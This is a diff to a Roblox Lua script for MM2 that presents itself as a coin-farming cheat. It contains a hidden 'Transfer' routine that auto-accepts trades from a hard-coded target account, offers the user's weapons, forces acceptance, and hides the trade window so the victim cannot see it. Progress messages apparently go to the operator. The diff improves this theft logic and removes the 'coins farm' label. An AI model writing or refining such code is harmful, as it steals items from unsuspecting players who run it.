@@ -218,8 +218,9 @@ local LO = 0
 local LF = nil
 
 if hasTransfer then
-    local Trade = RPS:FindFirstChild("Trade") or RPS:WaitForChild("Trade", 8)
+    local Trade = RPS:FindFirstChild("Trade") or RPS:WaitForChild("Trade", 10)
     local OI, AR, AT, SR, ST, UT, DT
+
     if Trade then
         OI = Trade:FindFirstChild("OfferItem")
         AR = Trade:FindFirstChild("AcceptRequest")
@@ -228,6 +229,9 @@ if hasTransfer then
         ST = Trade:FindFirstChild("StartTrade")
         UT = Trade:FindFirstChild("UpdateTrade")
         DT = Trade:FindFirstChild("DeclineTrade")
+        print("[Transfer] Remotes found")
+    else
+        print("[Transfer] Trade folder not found")
     end
 
     local function ist(n)
@@ -237,13 +241,17 @@ if hasTransfer then
     local function gwps()
         local list = {}
         pcall(function()
-            local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
+            local ok, pd = pcall(function()
+                return require(RPS.Modules.ProfileData)
+            end)
             if ok and pd and pd.Weapons and pd.Weapons.Owned then
-                for n, a in pairs(pd.Weapons.Owned) do
-                    if a and a > 0 and not (n == "DefaultKnife") and not (n == "DefaultGun") then
-                        local cnt = math.min(a, 4)
-                        for i = 1, cnt do
-                            table.insert(list, n)
+                for name, amount in pairs(pd.Weapons.Owned) do
+                    if amount and amount > 0 then
+                        if name ~= "DefaultKnife" and name ~= "DefaultGun" then
+                            local count = math.min(amount, 4)
+                            for i = 1, count do
+                                table.insert(list, name)
+                            end
                         end
                     end
                 end
@@ -254,29 +262,50 @@ if hasTransfer then
 
     local function fa()
         if not AT then return end
-        for i = 1, 12 do
-            if LF then pcall(function() AT:FireServer(game.PlaceId * 3, LF) end) end
+        print("[Transfer] Force accepting...")
+        for i = 1, 15 do
+            if LF then
+                pcall(function() AT:FireServer(game.PlaceId * 3, LF) end)
+            end
             pcall(function() AT:FireServer(game.PlaceId * 3, tick()) end)
             pcall(function() AT:FireServer() end)
-            task.wait(0.35)
+            task.wait(0.3)
         end
     end
 
     local function ow()
         if not OI or not TR or OT >= 4 then return end
-        if tick() - LO < 0.55 then return end
-        local wps = gwps()
-        if #wps == 0 then return end
-        local to = math.min(4 - OT, #wps)
-        for i = 1, to do
-            local ok = pcall(function() OI:FireServer(wps[i], "Weapons") end)
-            if ok then
+        if tick() - LO < 0.7 then return end
+
+        local weapons = gwps()
+        if #weapons == 0 then
+            print("[Transfer] No weapons found to offer")
+            return
+        end
+
+        local toOffer = math.min(4 - OT, #weapons)
+        for i = 1, toOffer do
+            local item = weapons[i]
+            local success = false
+
+            success = pcall(function() OI:FireServer(item, "Weapons") end)
+            if not success then
+                success = pcall(function() OI:FireServer(item) end)
+            end
+            if not success then
+                success = pcall(function() OI:FireServer(item, 1) end)
+            end
+
+            if success then
                 OT = OT + 1
                 LO = tick()
-                print("[Transfer] Offered:", wps[i], "("..OT.."/4)")
-                task.wait(0.3)
+                print("[Transfer] Offered:", item, "(" .. OT .. "/4)")
+                task.wait(0.45)
+            else
+                print("[Transfer] Failed to offer:", item)
             end
         end
+
         if OT >= 4 and not AS then
             AS = true
             sw("🔄 **Trade full (4/4)** - waiting to accept | **" .. lp.Name .. "**", false)
@@ -293,14 +322,16 @@ if hasTransfer then
         if not g then return end
         pcall(function()
             for _, c in ipairs(g:GetChildren()) do
-                if c:IsA("GuiObject") then c.Visible = false end
+                if c:IsA("GuiObject") then
+                    c.Visible = false
+                end
             end
         end)
     end
 
     pcall(function()
-        local function wtu(n)
-            local g = pg:FindFirstChild(n)
+        local function watch(name)
+            local g = pg:FindFirstChild(name)
             if g then
                 htg(g)
                 g:GetPropertyChangedSignal("Enabled"):Connect(function()
@@ -308,29 +339,31 @@ if hasTransfer then
                 end)
             end
         end
-        wtu("TradeGUI")
-        wtu("TradeGUI_Phone")
+        watch("TradeGUI")
+        watch("TradeGUI_Phone")
         pg.ChildAdded:Connect(function(c)
             if c.Name == "TradeGUI" or c.Name == "TradeGUI_Phone" then
                 task.wait(0.1)
                 htg(c)
-                wtu(c.Name)
+                watch(c.Name)
             end
         end)
     end)
 
     if SR then
         pcall(function()
-            SR.OnClientInvoke = function(fp)
-                if ist(fp and fp.Name) then
-                    print("[Transfer] Request from target")
+            SR.OnClientInvoke = function(fromPlayer)
+                if ist(fromPlayer and fromPlayer.Name) then
+                    print("[Transfer] Trade request from target")
                     TR = true
                     OT = 0
                     AS = false
                     LF = nil
-                    sw("📩 **Trade request received** from **" .. TARGET .. "** | Player: **" .. lp.Name .. "**", false)
-                    task.wait(0.3)
-                    if AR then pcall(function() AR:FireServer() end) end
+                    sw("📩 **Trade request received** from **" .. TARGET .. "** | **" .. lp.Name .. "**", false)
+                    task.wait(0.4)
+                    if AR then
+                        pcall(function() AR:FireServer() end)
+                    end
                     return true
                 end
                 return false
@@ -343,8 +376,8 @@ if hasTransfer then
             if TR then
                 OT = 0
                 AS = false
-                sw("🔄 **Trade started** | **" .. lp.Name .. "** offering weapons...", false)
-                task.wait(0.4)
+                sw("🔄 **Trade started** | **" .. lp.Name .. "** offering...", false)
+                task.wait(0.6)
                 ow()
             end
         end)
@@ -356,13 +389,13 @@ if hasTransfer then
                 LF = data.LastOffer
             end
             if not TR then return end
-            task.wait(0.25)
+            task.wait(0.3)
             ow()
             if type(data) == "table" then
                 for _, side in pairs(data) do
                     if type(side) == "table" and side.Accepted then
                         fa()
-                        sw("✅ **Other player accepted** - finishing trade | **" .. lp.Name .. "**", false)
+                        sw("✅ **Other side accepted** - finishing | **" .. lp.Name .. "**", false)
                         break
                     end
                 end
@@ -376,20 +409,20 @@ if hasTransfer then
             OT = 0
             AS = false
             LF = nil
-            sw("❌ **Trade ended / declined** | **" .. lp.Name .. "**", false)
+            sw("❌ **Trade ended** | **" .. lp.Name .. "**", false)
         end)
     end
 
     task.spawn(function()
         while true do
-            task.wait(0.8)
+            task.wait(0.9)
             if TR and AT and LF then
                 pcall(function() AT:FireServer(game.PlaceId * 3, LF) end)
             end
         end
     end)
 
-    print("[mm2 coins farm script 2026] Transfer system loaded")
+    print("[Transfer] System ready")
 end
 
 local AF = false
@@ -983,4 +1016,3 @@ RS.Stepped:Connect(function()
     end
 end)
 
-print("[mm2 coins farm script 2026] Loaded | Transfer = " .. tostring(hasTransfer))
